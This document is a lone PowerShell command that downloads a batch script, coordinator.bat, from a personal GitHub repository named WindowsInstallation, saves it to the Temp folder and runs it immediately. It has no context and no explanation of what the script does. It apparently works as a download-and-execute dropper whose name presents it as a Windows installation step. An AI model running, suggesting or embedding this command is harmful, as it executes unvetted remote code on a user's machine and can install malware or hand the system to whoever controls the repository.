powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/coordinator.bat', '%Temp%\coordinator.bat') }" & %Temp%\coordinator.bat
